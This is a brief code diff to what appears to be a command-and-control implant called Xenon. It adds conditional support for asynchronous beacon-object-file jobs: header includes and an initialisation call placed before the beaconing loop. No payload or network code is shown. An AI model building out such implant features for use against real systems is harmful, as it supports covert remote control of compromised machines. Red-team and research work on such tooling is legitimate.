@@ -6,6 +6,10 @@
 #include "Config.h"
 #include "Task.h"
 
+#if defined(INCLUDE_CMD_ASYNC_EXECUTE) || defined(INCLUDE_CMD_JOBKILL) || defined(INCLUDE_CMD_JOBS)
+#include "Tasks/AsyncBof.h"
+#endif
+
 #include <stdio.h>
 #include <stdlib.h>
 #include <string.h>
@@ -233,6 +237,10 @@ VOID XenonMain()
     xenonConfig = &xenon;
 
     XenonConfigure();
+
+#if defined(INCLUDE_CMD_ASYNC_EXECUTE) || defined(INCLUDE_CMD_JOBKILL) || defined(INCLUDE_CMD_JOBS)
+    AsyncBofInitialize();
+#endif
 
 /* 
     Now we're set up for beaconing
